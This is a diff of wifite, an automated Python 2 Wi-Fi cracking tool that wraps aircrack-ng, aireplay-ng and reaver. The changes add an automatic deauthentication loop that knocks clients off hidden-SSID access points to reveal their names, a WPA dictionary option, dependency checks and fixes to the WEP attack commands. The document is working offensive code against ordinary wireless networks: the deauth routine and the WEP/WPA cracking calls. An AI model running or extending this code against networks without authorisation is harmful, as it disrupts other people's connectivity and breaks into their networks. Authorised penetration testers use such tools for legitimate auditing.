@@ -8,17 +8,9 @@
 	author: derv82 at gmail
 	
 	TODO:
-	 * Check for airmon-ng, aircrack-ng, airodump-ng, aireplay-ng at startup.
-	 * Warn if tshark is not found -- is tshark required?
-	 * Show where to download reaver.
 
-	 * Deauth broadcast/clients on APs with unknown ESSID's when on fixed channel
-	 
 	 * WEP:
 	   - ability to pause/skip/continue	 
-	   - deauth clients to generate new packets if ivs/sec == 0
-	 
-	 * Option to "analyze" or "check" cap files for handshakes - in progress.
 	 
 	 * reaver:
 	 	 MONITOR ACTIVITY!
@@ -101,7 +93,7 @@ WEP_ARP_REPLAY      = False#True  # Various WEP-based attacks via aireplay-ng
 WEP_CHOPCHOP        = False  #
 WEP_FRAGMENT        = False#True  #
 WEP_CAFFELATTE      = False#True  #
-WEP_P0841           = True
+WEP_P0841           = False
 WEP_HIRTE           = True
 WEP_CRACK_AT_IVS    = 10000 # Number of IVS at which we start cracking
 WEP_IGNORE_FAKEAUTH = True  # When True, continues attack despite fake authentication failure
@@ -217,6 +209,8 @@ def main():
 	"""
 	global TARGETS_REMAINING, THIS_MAC
 	
+	initial_check() # Ensure required programs are installed.
+
 	handle_args() # Parse args from command line, set global variables.
 	
 	if not program_exists('reaver'):
@@ -307,7 +301,7 @@ def main():
 			if wep_success == 0:           print R,
 			elif wep_success == wep_total: print G,
 			else:                          print O,
-			print '%d/%d%s WEP attacks succeeded' % (wpa_success, wpa_total, W)
+			print '%d/%d%s WEP attacks succeeded' % (wep_success, wep_total, W)
 		
 			for finding in WEP_FINDINGS:
 				print '        ' + C+finding+W
@@ -320,6 +314,39 @@ def main():
 	
 	print ''
 	exit_gracefully(0)
+
+
+def initial_check():
+	"""
+		Ensures required programs are installed.
+	"""
+	airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng', 'packetforge-ng']
+	for air in airs:
+		if program_exists(air): continue
+		print R+' [!]'+O+' required program not found: %s' % (R+air+W)
+		print R+' [!]'+O+' this program is bundled with the aircrack-ng suite:'+W
+		print R+' [!]'+O+' wifite requires the aircrack-ng suite, available at:'+W
+		print GR+' [!]'+O+'        '+C+'http://www.aircrack-ng.org/\n'+W
+		exit_gracefully(1)
+	
+	printed = False
+	# Check reaver
+	if not program_exists('reaver'):
+		printed = True
+		print R+' [!]'+O+' WPS compatibility disabled: '+R+'reaver'+O+' not found'+W
+		print R+' [!]'+O+' available at '+C+'http://code.google.com/p/reaver-wps'+W
+	elif not program_exists('walsh') and not program_exists('wash'):
+		printed = True
+		print R+' [!]'+O+' reaver\'s scanning tool '+R+'walsh'+O+' (or '+R+'wash'+O+') was not found'+W
+		print R+' [!]'+O+' please re-install reaver or install walsh/wash separately'+W
+
+	# Check handshake-checking apps
+	recs = ['tshark', 'pyrit', 'cowpatty']
+	for rec in recs:
+		if program_exists(rec): continue
+		printed = True
+		print R+' [!]'+O+' the program %s is not required, but is recommended' % (R+rec+W)
+	if printed: print ''	
 
 
 def handle_args():
@@ -422,6 +449,16 @@ def handle_args():
 			elif args[i] == '-crack':
 				WPA_DONT_CRACK = False
 				print GR+' [+]'+W+' WPA cracking '+G+'enabled'+W
+			elif args[i] == '-dict':
+				i += 1
+				try:
+					WPA_DICTIONARY = args[i]
+				except IndexError: print R+' [!]'+O+' no WPA dictionary given!'
+				else:
+					if os.path.exists(args[i]):
+						print GR+' [+]'+W+' WPA dictionary set to %s' % (G+args[i]+W)
+					else:
+						print R+' [!]'+O+' WPA dictionary file not found: %s' % (args[i])
 			if args[i] == '-tshark':
 				WPA_HANDSHAKE_TSHARK = True
 				print GR+' [+]'+W+' tshark handshake verification '+G+'enabled'+W
@@ -661,7 +698,7 @@ def get_iface():
 
 
 
-
+
 
 
 
@@ -694,6 +731,8 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 	print GR+' [+] '+G+'initializing scan'+W+' ('+G+iface+W+'), updates at 5 sec intervals, '+G+'CTRL+C'+W+' when ready.'
 	(targets, clients) = ([], [])
 	try:
+		deauth_sent = 0.0
+		old_targets = []
 		while True:
 			time.sleep(0.3)
 			if not os.path.exists(temp + 'wifite-01.csv'):
@@ -727,16 +766,36 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 						except OSError: pass
 						except UnboundLocalError: pass
 						return ([t],clients)
-			"""
-			if channel != 0:
+			
+			# If there are unknown SSIDs, send deauths to them.
+			if channel != 0 and time.time() - deauth_sent > 5:
+				deauth_sent = time.time()
 				for t in targets:
 					if t.ssid == '':
+						print "\r %s deauthing hidden access point (%s)               \r" % \
+						      (GR+sec_to_hms(time.time() - time_started)+W, G+t.bssid+W),
+						stdout.flush()
 						# Time to deauth
 						cmd = ['aireplay-ng',
 						       '--deauth', '1',
-									 '-b',
-									 [
-			"""
+						       '-a', t.bssid]
+						for c in clients:
+							if c.station == t.bssid:
+								cmd.append('-c')
+								cmd.append(c.bssid)
+								break
+						cmd.append(iface)
+						proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)
+						proc_aireplay.wait()
+						time.sleep(0.5)
+					else:
+						for ot in old_targets:
+							if ot.ssid == '' and ot.bssid == t.bssid:
+								print '\r %s successfully decloaked "%s"                     ' % \
+								        (GR+sec_to_hms(time.time() - time_started)+W, G+t.ssid+W)
+
+				old_targets = targets[:]
+			
 			print ' %s %s wireless networks. %s target%s and %s client%s found   \r' % (
 			      GR+sec_to_hms(time.time() - time_started)+W, G+'scanning'+W, 
 			      G+str(len(targets))+W, '' if len(targets) == 1 else 's', 
@@ -818,7 +877,7 @@ def scan(channel=0, iface='', tried_rtl8187_fix=False):
 				victims.append(targets[int(r) - 1])
 		
 	if len(victims) == 0:
-		print O+'\n [!] '+R+'no targets selected.'+W
+		print O+'\n [!] '+R+'no targets selected.\n'+W
 		exit_gracefully(0)
 	
 	print ''
@@ -1146,37 +1205,48 @@ def analyze_capfile(capfile):
 	global TARGET_BSSID, TARGET_ESSID
 	
 	if TARGET_ESSID == '' and TARGET_BSSID == '':
-		print R+' [!]'+O+' some programs require target bssid and essid'
+		print R+' [!]'+O+' target ssid and bssid are required to check for handshakes'
 		print R+' [!]'+O+' please enter essid (access point name) using -e <name>'
 		print R+' [!]'+O+' and/or target bssid (mac address) using -b <mac>\n'
 		# exit_gracefully(1)
 	
 	if TARGET_BSSID == '':
-		# Get first BSSID found in tshark!
+		# Get the first BSSID found in tshark!
 		TARGET_BSSID = get_bssid_from_cap(TARGET_ESSID, capfile)
-		if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
+		# if TARGET_BSSID.find('->') != -1: TARGET_BSSID == ''
 		if TARGET_BSSID == '':
-			print R+' [!]'+O+' unable to find BSSID from ESSID!'
+			print R+' [!]'+O+' unable to guess BSSID from ESSID!'
 		else:
-			print GR+' [+]'+W+' found bssid: %s' % (G+TARGET_BSSID+W)
+			print GR+' [+]'+W+' guessed bssid: %s' % (G+TARGET_BSSID+W)
 	
 	if TARGET_BSSID != '' and TARGET_ESSID == '':
 		TARGET_ESSID = get_essid_from_cap(TARGET_BSSID, capfile)
 		
-	print GR+' [+]'+W+' checking for handshakes in %s' % (G+capfile+W)
+	print GR+'\n [+]'+W+' checking for handshakes in %s' % (G+capfile+W)
 	
 	t = Target(TARGET_BSSID, '', '', '', 'WPA', TARGET_ESSID)
 	
-	result = has_handshake_pyrit(t, capfile)
-	print GR+' [+]'+W+'    '+G+'pyrit'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
-	result = has_handshake_cowpatty(t, capfile, nonstrict=True)
-	print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (nonstrict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
-	result = has_handshake_cowpatty(t, capfile, nonstrict=False)
-	print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (strict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
-	result = has_handshake_tshark(t, capfile)
-	print GR+' [+]'+W+'    '+G+'tshark'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
-	result = has_handshake_aircrack(t, capfile)
-	print GR+' [+]'+W+'    '+G+'aircrack-ng'+W+':\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
+	if program_exists('pyrit'):
+		result = has_handshake_pyrit(t, capfile)
+		print GR+' [+]'+W+'    '+G+'pyrit'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
+	else: print R+' [!]'+O+' program not found: pyrit'
+	if program_exists('cowpatty'):
+		result = has_handshake_cowpatty(t, capfile, nonstrict=True)
+		print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (nonstrict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
+		result = has_handshake_cowpatty(t, capfile, nonstrict=False)
+		print GR+' [+]'+W+'    '+G+'cowpatty'+W+' (strict):\t %s' % (G+'found!'+W if result else O+'not found'+W)
+	else: print R+' [!]'+O+' program not found: cowpatty'
+	if program_exists('tshark'):
+		result = has_handshake_tshark(t, capfile)
+		print GR+' [+]'+W+'    '+G+'tshark'+W+':\t\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
+	else: print R+' [!]'+O+' program not found: tshark'
+	if program_exists('aircrack-ng'):
+		result = has_handshake_aircrack(t, capfile)
+		print GR+' [+]'+W+'    '+G+'aircrack-ng'+W+':\t\t %s' % (G+'found!'+W if result else O+'not found'+W)
+	else: print R+' [!]'+O+' program not found: aircrack-ng'
+
+	print ''
+
 	exit_gracefully(0)
 
 
@@ -1194,9 +1264,9 @@ def get_essid_from_cap(bssid, capfile):
 	for line in proc.communicate()[0].split('\n'):
 		if line.find('SSID=') != -1:
 			essid = line[line.find('SSID=')+5:]
-			print GR+' [+]'+W+' found essid: %s' % (G+essid+W)
+			print GR+' [+]'+W+' guessed essid: %s' % (G+essid+W)
 			return essid
-	print R+' [!]'+O+' unable to find essid!'+W
+	print R+' [!]'+O+' unable to guess essid!'+W
 	return ''
 
 
@@ -1887,7 +1957,7 @@ def attack_wep(iface, target, clients):
 						       '-a', '1',
 						       '-l', temp + 'wepkey.txt',
 						       temp + 'wep-01.cap']
-						print "\r %s starting %s (%sover %d ivs%s)" % (current_hms, G+'cracker'+W, G, WEP_CRACK_AT_IVS, W)
+						print "\r %s starting %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracker'+W, G, WEP_CRACK_AT_IVS, W)
 						proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
 						started_cracking = True
 				
@@ -1904,6 +1974,8 @@ def attack_wep(iface, target, clients):
 					# Kill processes
 					send_interrupt(proc_airodump)
 					send_interrupt(proc_aireplay)
+					try: os.kill(proc_aireplay, SIGTERM)
+					except: pass
 					send_interrupt(proc_aircrack)
 					# Remove files generated by airodump/aireplay/packetforce
 					remove_airodump_files('wep')
@@ -2005,9 +2077,9 @@ def attack_wep(iface, target, clients):
 			
 		
 	if successful:
-		print GR+'\n [0:00:00]'+W+' attack completed: '+G+'success!'+W
+		print GR+'\n [0:00:00]'+W+' attack complete: '+G+'success!'+W
 	else:
-		print GR+'\n [0:00:00]'+W+' attack completed: '+R+'failed'+W
+		print GR+'\n [0:00:00]'+W+' attack complete: '+R+'failed'+W
 	
 	send_interrupt(proc_airodump)
 	if proc_aireplay != None:
@@ -2126,8 +2198,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 		       '-b', target.bssid]
 		if len(clients) > 0:
 			cmd.append('-h')
-			cmd.append(clients[0])
-		
+			cmd.append(clients[0].bssid)
 		cmd.append(iface)
 		
 	elif attack_num == 4:
@@ -2147,7 +2218,7 @@ def get_aireplay_command(iface, attack_num, target, clients, client_mac):
 			return ''
 		cmd = ['aireplay-ng',
 		       '--cfrag',
-		       '-h', clients[0],
+		       '-h', clients[0].bssid,
 		       iface]
 		
 	return cmd
